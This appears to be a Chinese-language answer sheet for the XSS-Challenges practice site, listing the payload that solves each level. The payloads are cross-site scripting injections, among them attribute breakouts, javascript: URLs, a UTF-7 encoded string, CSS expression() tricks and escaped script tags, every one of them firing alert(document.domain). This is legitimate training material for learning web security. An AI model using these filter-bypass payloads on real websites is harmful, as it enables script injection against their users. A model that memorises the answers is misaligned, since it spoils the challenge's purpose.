# XSS-Challenges
http://xss-quiz.int21h.jp/

使用IE11浏览器

1 \<img onclick="alert(document.domain);" src=\>

2 "\</b\>\<script\>alert(document.domain);\</script\>\<b\>"

4 把type为hidden的input的type改为text 然后在框内输入"><script>alert(document.domain)</script>

5 将input的maxlength改为150或者一个较大的数 然后在框内输入 "><script>alert(document.domain)</script>

6 " onclick = "alert(document.domain)"

7 " onclick = alert(document.domain)

8 javascript:alert(document.domain)

9 将charset的值改为utf-7 然后输入+ACIAIABvAG4AYwBsAGkAYwBrACAAPQAgACIAIABhAGwAZQByAHQAKABkAG8AYwB1AG0AZQBuAHQALgBkAG8AbQBhAGkAbgApAA0AC-

10 " onclick = "alert(document.domaidomainn)"

11 "\>\<a href="javascrip&#x9;t:alert(document.domain)"\>\<"xss\</a>

12 `` onclick = alert(document.domain)

13 aa:expression(if(!window.x){alert(document.domain);window.x=1})

14 aa:expre/**/ssion(if(!window.x){alert(document.domain);window.x=1})

15 \\\\x3Cscript\\\\x3Ealert(document.domain)\\\\x3C/script\\\\x3E

16 \\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e
